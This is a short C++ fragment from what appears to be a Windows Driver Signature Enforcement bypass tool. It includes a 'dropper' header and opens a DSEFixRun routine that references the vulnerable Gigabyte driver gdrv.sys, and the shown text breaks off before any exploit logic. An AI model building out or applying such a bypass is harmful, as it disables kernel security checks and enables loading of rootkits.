...
#include "../include/dseFix/dropper.h"
...
void DSEFixRun(std::string target_driver) {
	std::cout << "Executing DSE Fix routine..." << std::endl;

	const wchar_t* DriverPath = L"C:\\Windows\\System32\\Drivers\\gdrv.sys";

	std::wstring target_driver_wstr = string_to_wstring(target_driver);
	PWCHAR DriverName = const_cast<PWCHAR>(target_driver_wstr.c_str());
